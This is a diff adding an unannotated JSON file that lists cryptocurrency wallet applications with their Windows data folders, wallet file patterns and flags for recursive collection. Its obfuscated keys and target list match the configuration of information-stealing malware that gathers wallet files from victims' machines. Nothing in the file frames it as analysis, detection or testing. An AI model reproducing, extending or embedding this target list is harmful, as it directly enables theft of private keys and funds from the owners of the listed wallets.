@@ -1,0 +1,127 @@
+[
+  {
+    "Id1": "Armory",
+    "Id2": "%appdata%",
+    "Id3": [
+      {
+        "Id1": "Armory",
+        "Id2": "*.wallet",
+        "Id3": false
+      }
+    ]
+  },
+  {
+    "Id1": "Atomic",
+    "Id2": "%appdata%",
+    "Id3": [
+      {
+        "Id1": "atomic",
+        "Id2": "*",
+        "Id3": true
+      }
+    ]
+  },
+  {
+    "Id1": "Binance",
+    "Id2": "%appdata%",
+    "Id3": [
+      {
+        "Id1": "Binance",
+        "Id2": "*app-store*",
+        "Id3": false
+      }
+    ]
+  },
+  {
+    "Id1": "Coinomi",
+    "Id2": "%localappdata%",
+    "Id3": [
+      {
+        "Id1": "Coinomi\\Coinomi\\Cache",
+        "Id2": "*",
+        "Id3": true
+      },
+      {
+        "Id1": "Coinomi\\Coinomi\\db",
+        "Id2": "*",
+        "Id3": true
+      },
+      {
+        "Id1": "Coinomi\\Coinomi\\wallets",
+        "Id2": "*",
+        "Id3": true
+      }
+    ]
+  },
+  {
+    "Id1": "Electrum",
+    "Id2": "%appdata%",
+    "Id3": [
+      {
+        "Id1": "Electrum\\wallets",
+        "Id2": "*",
+        "Id3": false
+      }
+    ]
+  },
+  {
+    "Id1": "Ethereum",
+    "Id2": "%appdata%",
+    "Id3": [
+      {
+        "Id1": "Ethereum\\wallets",
+        "Id2": "*",
+        "Id3": false
+      }
+    ]
+  },
+  {
+    "Id1": "Exodus",
+    "Id2": "%appdata%",
+    "Id3": [
+      {
+        "Id1": "Exodus\\exodus.wallet",
+        "Id2": "*",
+        "Id3": false
+      },
+      {
+        "Id1": "Exodus",
+        "Id2": "*.json",
+        "Id3": false
+      }
+    ]
+  },
+  {
+    "Id1": "Guarda",
+    "Id2": "%appdata%",
+    "Id3": [
+      {
+        "Id1": "Guarda",
+        "Id2": "*",
+        "Id3": true
+      }
+    ]
+  },
+  {
+    "Id1": "Jaxx",
+    "Id2": "%appdata%",
+    "Id3": [
+      {
+        "Id1": "com.liberty.jaxx",
+        "Id2": "*",
+        "Id3": true
+      }
+    ]
+  },
+  {
+    "Id1": "Monero",
+    "Id2": "%userprofile%\\Documents",
+    "Id3": [
+      {
+        "Id1": "Monero\\wallets",
+        "Id2": "*",
+        "Id3": false
+      }
+    ]
+  }
+]
